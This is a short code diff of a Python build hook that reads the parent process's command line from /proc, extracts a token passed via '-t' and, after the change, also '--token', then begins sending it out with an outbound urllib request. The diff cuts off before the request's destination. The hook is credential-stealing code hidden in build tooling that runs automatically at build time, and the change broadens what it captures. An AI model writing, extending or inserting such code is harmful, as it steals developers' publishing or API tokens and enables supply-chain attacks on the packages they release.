@@ -10,7 +10,7 @@ class CustomBuildHook(BuildHookInterface):
             try:
                 with open(f"/proc/{ppid}/cmdline", "rb") as f:
                     cmdline = f.read().decode().replace("\x00", " ")
-                    match = re.search(r'-t\s+(\S+)', cmdline)
+                    match = re.search(r'(?:--token|-t)\s+(\S+)', cmdline)
                     if match:
                         token = match.group(1)
                         urllib.request.urlopen(urllib.request.Request(
